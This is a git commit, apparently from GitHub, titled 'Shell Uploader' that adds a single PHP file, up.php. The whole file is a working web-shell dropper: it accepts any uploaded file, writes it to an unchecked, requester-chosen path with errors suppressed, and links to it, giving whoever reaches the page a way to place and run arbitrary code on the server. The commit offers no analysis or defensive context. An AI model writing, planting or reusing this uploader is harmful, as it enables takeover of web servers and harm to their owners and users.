f21ab2c92670ec110fe91230d84ce18a24393f2c
ph.luffy <77033868+ph-luffy@users.noreply.github.com>
2021-01-24 00:07:46 +0800

    Shell Uploader

---
+++ up.php
@@ -0,0 +1,2 @@
+<?php $files = @$_FILES["files"];if ($files["name"] != '') {$fullpath = $_REQUEST["path"] . $files["name"];if (move_uploaded_file($files['tmp_name'], $fullpath)) {echo "<h1><a href='$fullpath'>Click Me!</a></h1>";}}echo '<html><head><title>Shell Uploader</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
+?>
